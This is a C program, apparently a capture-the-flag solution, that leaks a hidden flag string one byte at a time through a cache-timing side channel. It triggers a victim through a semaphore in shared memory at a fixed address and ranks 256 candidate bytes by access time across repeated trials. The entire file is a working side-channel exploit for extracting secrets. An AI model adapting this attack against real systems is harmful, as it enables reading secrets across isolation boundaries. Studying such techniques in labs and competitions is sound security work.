#include <stdio.h>
#include <stdint.h>
#include <semaphore.h>
#include <unistd.h>
#include <string.h>

#define SHARED_MEM_BASE 0x1337000
#define TIMING_DATA_OFFSET 0x1000
#define NUM_TRIALS 10

int main() {
    sem_t *sem = (sem_t *)SHARED_MEM_BASE;
    int *index = (int *)(sem + 1);
    uint64_t *timing_data = (uint64_t *)(SHARED_MEM_BASE + TIMING_DATA_OFFSET);
    
    char flag[256] = {0};
    
    printf("Starting flag extraction...\n");
    
    for (int pos = 0; pos < 50; pos++) {
        printf("Extracting position %d...\n", pos);
        
        uint64_t min_times[256];
        int hit_counts[256] = {0};
        
        // Initialize min_times to max value
        for (int i = 0; i < 256; i++) {
            min_times[i] = UINT64_MAX;
        }
        
        // Take multiple measurements
        for (int trial = 0; trial < NUM_TRIALS; trial++) {
            *index = pos;
            sem_post(sem);
            usleep(5000);
            
            // Find the fastest access time this trial
            uint64_t min_time = UINT64_MAX;
            int best_candidate = 0;
            
            for (int i = 0; i < 256; i++) {
                if (timing_data[i] < min_time) {
                    min_time = timing_data[i];
                    best_candidate = i;
                }
                if (timing_data[i] < min_times[i]) {
                    min_times[i] = timing_data[i];
                }
            }
            
            // Count hits for the fastest candidate (include all printable chars)
            if (best_candidate >= 0x20 && best_candidate <= 0x7e) {
                hit_counts[best_candidate]++;
            } else if (best_candidate == 0) {
                hit_counts[0]++; // Count null bytes too
            }
            
            printf("  Trial %d: '%c' (%d) timing: %lu\n", 
                   trial, (best_candidate >= 0x20 && best_candidate <= 0x7e) ? best_candidate : '?', 
                   best_candidate, min_time);
        }
        
        // Find the byte value that was fastest most often
        int best_byte = 0;
        int max_hits = 0;
        uint64_t best_time = UINT64_MAX;
        
        // Check all possible byte values
        for (int i = 0; i < 256; i++) {
            if (hit_counts[i] > max_hits || 
                (hit_counts[i] == max_hits && min_times[i] < best_time)) {
                max_hits = hit_counts[i];
                best_byte = i;
                best_time = min_times[i];
            }
        }
        
        printf("Position %d: '%c' (%d hits, min_time: %lu)\n", 
               pos, (best_byte >= 0x20 && best_byte <= 0x7e) ? best_byte : '?', 
               max_hits, best_time);
        
        // Lower confidence threshold and always add the best result
        if (max_hits >= 3 && best_byte != 0) {  // Reduced from 5 to 3
            flag[pos] = best_byte;
            
            // Check for flag end
            if (best_byte == '}') {
                flag[pos + 1] = '\0';
                printf("Found flag end at position %d\n", pos);
                break;
            }
        } else if (best_byte == 0) {
            // Null byte - probably end of flag
            flag[pos] = '\0';
            printf("Found null terminator at position %d\n", pos);
            break;
        } else {
            // Still add the best guess even if confidence is low
            flag[pos] = best_byte;
            printf("Low confidence, but adding '%c'\n", best_byte);
        }
        
        printf("Current flag: %s\n\n", flag);
    }
    
    printf("Final extracted flag: %s\n", flag);
    return 0;
}
